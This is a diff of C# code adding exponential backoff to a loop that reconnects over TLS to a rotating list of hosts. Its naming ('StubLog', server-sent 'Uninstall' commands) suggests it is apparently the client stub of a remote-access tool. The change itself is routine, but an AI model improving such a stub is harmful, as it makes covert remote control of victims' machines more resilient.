@@ -383,16 +383,19 @@ partial class Program
 
         // Auto-reconnect loop — cycles through all hosts on each failure
         int hostIdx = 0;
+        int reconnectDelay = Config.ReconnectDelayMs;
         while (true)
         {
             var host = Config.Hosts[hostIdx % Config.Hosts.Length];
             hostIdx++;
+            bool connected = false;
             try
             {
                 Breadcrumb($"CONNECTING to {host}:{Config.Port}");
                 StubLog.Info($"Connecting to {host}:{Config.Port}...");
                 using var client = new TlsClient(host, Config.Port);
                 await client.RunAsync(CancellationToken.None);
+                connected = true;
 
                 // Server sent Disconnect or Uninstall — stop reconnecting
                 if (!client.ShouldReconnect)
@@ -408,8 +411,14 @@ partial class Program
                 StubLog.Error($"Connection error ({host}): {ex.GetType().Name}: {ex.Message}");
             }
 
-            // Wait before reconnecting
-            await Task.Delay(Config.ReconnectDelayMs);
+            // Reset delay after a successful connection, otherwise back off exponentially
+            // to avoid hammering the server during an outage (reconnect storm prevention).
+            if (connected)
+                reconnectDelay = Config.ReconnectDelayMs;
+            else
+                reconnectDelay = Math.Min(reconnectDelay * 2, 120_000); // cap at 2 min
+
+            await Task.Delay(reconnectDelay);
         }
     }
 }
